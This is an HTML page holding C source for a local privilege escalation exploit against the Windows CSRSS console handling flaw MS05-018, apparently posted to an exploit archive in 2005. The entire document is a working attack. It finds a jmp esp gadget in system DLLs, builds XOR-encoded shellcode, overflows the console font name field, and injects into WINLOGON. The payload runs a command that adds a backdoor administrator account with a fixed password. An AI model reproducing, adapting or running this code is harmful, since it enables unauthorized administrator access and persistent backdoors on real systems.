<html><head><title>MS Windows CSRSS Local Privilege Escalation Exploit (MS05-018)</title></head><pre>#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;tlhelp32.h&gt;

#pragma comment (lib,&quot;Advapi32.lib&quot;)

typedef struct _CONSOLE_STATE_INFO    {      
	  /* 0x00 */  DWORD cbSize;
      /* 0x04 */  COORD ScreenBufferSize;
      /* 0x08 */  COORD WindowSize;
      /* 0x0c */  POINT WindowPosition;
      /* 0x14 */  COORD FontSize;
      /* 0x18 */  DWORD FontFamily;
      /* 0x1c */  DWORD FontWeight;
      /* 0x20 */  WCHAR FaceName[0x200];
} CONSOLE_STATE_INFO, *PCONSOLE_STATE_INFO;

typedef struct xxx
{
	DWORD	dw[6];
	char	cmd[0x50];
}address_and_cmd;

char decoder[]=
&quot;\x8b\xdc&quot;
&quot;\xBE\x44\x59\x41\x53\x46\xBF\x44\x59\x34\x53\x47\x43\x39\x33\x75&quot;
&quot;\xFB\x83\xC3\x04\x80\x33\x97\x43\x39\x3B\x75\xF8\x45\x59\x41\x53&quot;;
//user=e
//pass=asd#321
char add_user[]=
&quot;\x90\x90\x90\x90\x90\x90\x90\x8D\x7b\x98\xFF\x77\x14\x6A\x00\x68&quot;
&quot;\x2A\x04\x00\x00\xFF\x17\x8B\xD8\x6A\x04\x68\x00\x10\x00\x00\x68&quot;
&quot;\x00\x01\x00\x00\x6A\x00\x53\xFF\x57\x04\x8B\xF0\x6A\x00\x68\x00&quot;
&quot;\x01\x00\x00\x8D\x47\x18\x50\x56\x53\xFF\x57\x08\x33\xC0\x50\x50&quot;
&quot;\x56\xFF\x77\x10\x50\x50\x53\xFF\x57\x0C&quot;;
char decode_end_sign[]=&quot;EY4S&quot;;
char sc[0x200];

char	szConsoleTitle[256];

DWORD search_jmpesp()
{
	char szDLL[][30] = {&quot;ntdll.dll&quot;,
						&quot;kernel32.dll&quot;,
						&quot;user32.dll&quot;,
						&quot;gdi32.dll&quot;,						
						&quot;winsrv.dll&quot;,
						&quot;csrsrv.dll&quot;,
						&quot;basesrv.dll&quot;};
	int		i,y;
	BOOL	done;
	HMODULE	h;
	BYTE	*ptr;
	DWORD	addr=0;

	for(i=0;i&lt;sizeof(szDLL)/sizeof(szDLL[0]);i++)
	{
		done = FALSE;
		h = LoadLibrary(szDLL[i]);
		if(h == NULL) 
			continue;
		printf(&quot;[+] start search \&quot;FF E4\&quot; in %s\n&quot;, szDLL[i]);
		ptr = (BYTE *)h;
		for(y = 0;!done;y++) 
		{ 
			__try 
			{ 
				if(ptr[y] == (BYTE)'\xFF' &amp;&amp; ptr[y+1] == (BYTE)'\xE4') 
				{ 
					addr = (int)ptr + y; 
					done = TRUE;
					printf(&quot;[+] found \&quot;FF E4\&quot;(jmp esp) in %X[%s]\n&quot;, addr, szDLL[i]);
				} 
			} 
			__except(EXCEPTION_EXECUTE_HANDLER)
			{
				done = TRUE; 
			} 
		} 
		FreeLibrary(h);
		if(addr) break;
	}
	return addr;
}
BOOL make_shellcode(DWORD dwTargetPid)
{
	HMODULE	hKernel32;
	address_and_cmd	aac;
	int		i=0, j=0, size=0;

	hKernel32 = LoadLibrary(&quot;kernel32.dll&quot;);
	if(!hKernel32) return FALSE;
	aac.dw[0] = (DWORD)GetProcAddress(hKernel32, &quot;OpenProcess&quot;);
	aac.dw[1] = (DWORD)GetProcAddress(hKernel32, &quot;VirtualAllocEx&quot;);
	aac.dw[2] = (DWORD)GetProcAddress(hKernel32, &quot;WriteProcessMemory&quot;);
	aac.dw[3] = (DWORD)GetProcAddress(hKernel32, &quot;CreateRemoteThread&quot;);
	aac.dw[4] = (DWORD)GetProcAddress(hKernel32, &quot;WinExec&quot;);
	aac.dw[5] = dwTargetPid;

	memset(aac.cmd, 0, sizeof(aac.cmd));
	strcpy(aac.cmd, &quot;cmd /c net user e asd#321 /add &amp;&amp; net localgroup administrators e /add&quot;);

	//encode
	strcpy(sc, decoder);
	for(i=0;i&lt;sizeof(add_user);i++)
		add_user[i]^=(BYTE)'\x97';
	strcat(sc, add_user);
	for(i=0;i&lt;sizeof(aac);i++)
		((char *)&amp;aac)[i]^=(BYTE)'\x97';
	size=strlen(sc);
	memcpy(&amp;sc[size], (char *)&amp;aac, sizeof(aac));
	size+=sizeof(aac);
	sc[size]='\x0';
	strcat(sc, decode_end_sign);

	return TRUE;
}

void exploit(HWND hwnd,	DWORD dwPid)
{
	HANDLE				hFile;
	LPVOID				lp;
	int					i, index;
	DWORD				dwJMP;
	CONSOLE_STATE_INFO	csi;


	memset((void *)&amp;csi, 0, sizeof(csi));
	csi.cbSize = sizeof(csi);
	csi.ScreenBufferSize.X = 0x0050;
	csi.ScreenBufferSize.Y = 0x012c;
	csi.WindowSize.X = 0x0050;
	csi.WindowSize.Y=0x0019;
	csi.WindowPosition.x = 0x58;
	csi.WindowPosition.y = 0x58;
	csi.FontSize.X = 0;
	csi.FontSize.Y=0xc;
	csi.FontFamily = 0x36;
	csi.FontWeight = 0x190;
	
	for(i=0;i&lt;0x58;i++)
		((char *)csi.FaceName)[i] = '\x90';
	dwJMP = search_jmpesp();
	if(!dwJMP)
	{
		printf(&quot;[-] search FF E4 failed.\n&quot;);
		return;
	}
	memcpy(&amp;((char *)csi.FaceName)[0x58], (char *)&amp;dwJMP, 4);
	for(i=0;i&lt;0x20;i++)
		strcat((char *)csi.FaceName, &quot;\x90&quot;);
	index = strlen((char *)csi.FaceName);

	if(!make_shellcode(dwPid)) return;
	memcpy(&amp;((char *)csi.FaceName)[index], (char *)sc, strlen(sc));

	hFile = CreateFileMappingW((void *)0xFFFFFFFF,0,4,0,csi.cbSize,0);
	if(!hFile)
	{
		printf(&quot;[-] CreateFileMapping failed:%d\n&quot;, GetLastError());
		return;
	}
	printf(&quot;[+] CreateFileMapping OK!\n&quot;);
	lp = MapViewOfFile(hFile, 0x0F001F,0,0,0);
	if(!lp)
	{
		printf(&quot;[-] MapViewOfFile failed:%d\n&quot;, GetLastError());
		return;
	}
	printf(&quot;[+] MapViewOfFile OK!\n&quot;);
	//copy
	memcpy((unsigned short *)lp, (unsigned short *)&amp;csi, csi.cbSize);

	printf(&quot;[+] Send Exploit!\n&quot;);
	SendMessageW(hwnd,0x4C9,(WPARAM)hFile,0);
}

void main(int argc, char **argv)
{
	DWORD	dwRet;
	HWND	hwnd = NULL;
	DWORD	dwPid = 0;
	HANDLE hSnapshot = NULL;
	PROCESSENTRY32		pe;

	printf( &quot;MS05-018 windows CSRSS.EXE Stack Overflow exp v1.0\n&quot;
			&quot;Affect: Windows 2000 sp3/sp4 (all language)\n&quot;
			&quot;Coded by eyas &lt;eyas at xfocus.org&gt;\n&quot;
			&quot;http://www.xfocus.net\n\n&quot;);
	
	if(argc==2)
	{
		dwPid = atoi(argv[1]);
	}
	else
	{
		printf(&quot;Usage: %s pid\n\n&quot;, argv[0]);
		hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		pe.dwSize = sizeof(PROCESSENTRY32);
		Process32First(hSnapshot,&amp;pe);
		do
		{		
			if( strcmpi(pe.szExeFile, &quot;WINLOGON.EXE&quot;) == 0)
			{
				printf(&quot;[+] PID=%d Process=%s\n&quot;, pe.th32ProcessID, pe.szExeFile);
			}
		}
		while(Process32Next(hSnapshot,&amp;pe)==TRUE);
		CloseHandle (hSnapshot);
	}

	if(!dwPid)	return;

	if(!FreeConsole())
		printf(&quot;[-] FreeConsole failed:%d\n&quot;, GetLastError());
	else
	{
		printf(&quot;[+] FreeConsole ok.\n&quot;);
		if(!AllocConsole())
			printf(&quot;[-] AllocConsole failed:%d\n&quot;, GetLastError());
		else
			printf(&quot;[+] AllocConsole ok.\n&quot;);
	}

	dwRet = GetConsoleTitle(szConsoleTitle, sizeof(szConsoleTitle));
	if(dwRet)
	{
		printf(&quot;[+] Get Console Title OK:\&quot;%s\&quot;\n&quot;, szConsoleTitle);
	}
	else
	{
		printf(&quot;[-] Get Console Title failed.\n&quot;);
		return;
	}

	hwnd = FindWindow(&quot;ConsoleWindowClass&quot;,szConsoleTitle); 
	if(hwnd)
		printf(&quot;[+] bingo! found hwnd=%X\n&quot;, hwnd);
	else
	{
		printf(&quot;[-] can't found hwnd!\n&quot;);
		return;
	}

	exploit(hwnd, dwPid);
	printf(&quot;[+] Done.\n&quot;);
}

// milw0rm.com [2005-09-06]</pre></html>